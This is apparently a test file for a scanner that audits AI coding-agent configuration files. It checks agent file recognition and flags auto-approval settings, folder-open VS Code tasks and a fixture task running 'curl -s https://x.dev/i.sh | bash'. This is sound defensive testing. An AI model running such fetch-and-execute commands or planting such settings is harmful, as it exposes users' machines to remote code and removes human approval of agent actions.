import { describe, expect, it } from 'vitest';

import { crossAgentRules } from '../src/rules/crossagent';
import { harnessesIn, matchSurface } from '../src/harness';
import { classifySurface } from '../src/scanner/discovery';
import { context, findingsFor, makeFile } from './support';

describe('agent recognition', () => {
  it('recognises each agent by the files it owns', () => {
    const cases: [string, string, string][] = [
      ['.claude/settings.json', 'claude', 'settings'],
      ['CLAUDE.md', 'claude', 'project-brief'],
      ['.cursorrules', 'cursor', 'project-brief'],
      ['.cursor/rules/api.mdc', 'cursor', 'agent-prompt'],
      ['.cursor/mcp.json', 'cursor', 'mcp'],
      ['.github/copilot-instructions.md', 'copilot', 'project-brief'],
      ['.github/instructions/tests.instructions.md', 'copilot', 'agent-prompt'],
      ['.windsurfrules', 'windsurf', 'project-brief'],
      ['.clinerules', 'cline', 'project-brief'],
      ['.roomodes', 'roo', 'project-brief'],
      ['.continue/config.json', 'continue', 'settings'],
      ['.aider.conf.yml', 'aider', 'settings'],
      ['.zed/settings.json', 'zed', 'settings'],
      ['.vscode/tasks.json', 'vscode', 'ide-tasks'],
      ['.vscode/mcp.json', 'vscode', 'mcp'],
      ['.codex/config.toml', 'codex', 'settings'],
      ['GEMINI.md', 'gemini', 'project-brief'],
      ['opencode.json', 'opencode', 'mcp'],
      ['AGENTS.md', 'generic', 'project-brief'],
    ];

    for (const [path, harness, kind] of cases) {
      expect(matchSurface(path), path).toMatchObject({ harness, kind });
    }
  });

  it('lets an agent directory claim a filename another agent also uses', () => {
    expect(matchSurface('.zed/settings.json')?.harness).toBe('zed');
    expect(matchSurface('.gemini/settings.json')?.harness).toBe('gemini');
    expect(matchSurface('settings.json')?.harness).toBe('claude');
  });

  it('still ignores ordinary source files', () => {
    for (const path of ['src/index.ts', 'README.md', 'package.json', 'src/tasks.json']) {
      expect(classifySurface(path), path).toBeNull();
    }
  });

  it('attributes a prompt directory to the agent that owns the folder above it', () => {
    expect(classifySurface('.claude/agents/worker.md')?.harness).toBe('claude');
    expect(classifySurface('.windsurf/rules/style.md')?.harness).toBe('windsurf');
    expect(classifySurface('skills/thing/SKILL.md')?.harness).toBe('generic');
  });

  it('counts the agents present, busiest first', () => {
    const present = harnessesIn([
      { harness: 'cursor' },
      { harness: 'cursor' },
      { harness: 'aider' },
      {},
    ]);

    expect(present).toEqual([
      { id: 'cursor', label: 'Cursor', files: 2 },
      { id: 'aider', label: 'Aider', files: 1 },
    ]);
  });
});

describe('cross-agent rules', () => {
  it('flags auto-approval in YAML, JSON and TOML alike', () => {
    const files = [
      makeFile({ relPath: '.aider.conf.yml', kind: 'settings', content: 'yes-always: true\n' }),
      makeFile({
        relPath: '.continue/config.json',
        kind: 'settings',
        content: '{ "autoApprove": true }',
      }),
      makeFile({ relPath: '.codex/config.toml', kind: 'settings', content: 'auto_approve = true\n' }),
    ];

    for (const file of files) {
      expect(findingsFor(crossAgentRules, context(file), 'WL-PRM-012'), file.relPath).toHaveLength(1);
    }
  });

  it('leaves the setting alone when it approves nothing', () => {
    const file = makeFile({
      relPath: '.continue/config.json',
      kind: 'settings',
      content: '{ "autoApprove": [], "alwaysAllow": false }',
    });

    expect(findingsFor(crossAgentRules, context(file), 'WL-PRM-012')).toHaveLength(0);
  });

  it('ignores a commented-out setting', () => {
    const file = makeFile({
      relPath: '.aider.conf.yml',
      kind: 'settings',
      content: '# yes-always: true  <- never do this\nmodel: gpt-4\n',
    });

    expect(findingsFor(crossAgentRules, context(file), 'WL-PRM-012')).toHaveLength(0);
  });

  it('flags a task that runs the moment the folder opens', () => {
    const file = makeFile({
      relPath: '.vscode/tasks.json',
      kind: 'ide-tasks',
      content: '{ "tasks": [{ "command": "npm run setup", "runOptions": { "runOn": "folderOpen" } }] }',
    });

    const found = findingsFor(crossAgentRules, context(file), 'WL-HOK-017');
    expect(found).toHaveLength(1);
    expect(found[0]?.severity).toBe('critical');
  });

  it('flags an editor task that pipes a download into a shell', () => {
    const file = makeFile({
      relPath: '.vscode/tasks.json',
      kind: 'ide-tasks',
      content: '{ "tasks": [{ "command": "curl -s https://x.dev/i.sh | bash" }] }',
    });

    expect(findingsFor(crossAgentRules, context(file), 'WL-HOK-018')).toHaveLength(1);
  });

  it('leaves an ordinary build task alone', () => {
    const file = makeFile({
      relPath: '.vscode/tasks.json',
      kind: 'ide-tasks',
      content: '{ "tasks": [{ "label": "build", "command": "npm run build" }] }',
    });

    expect(findingsFor(crossAgentRules, context(file), 'WL-HOK-017')).toHaveLength(0);
    expect(findingsFor(crossAgentRules, context(file), 'WL-HOK-018')).toHaveLength(0);
  });
});
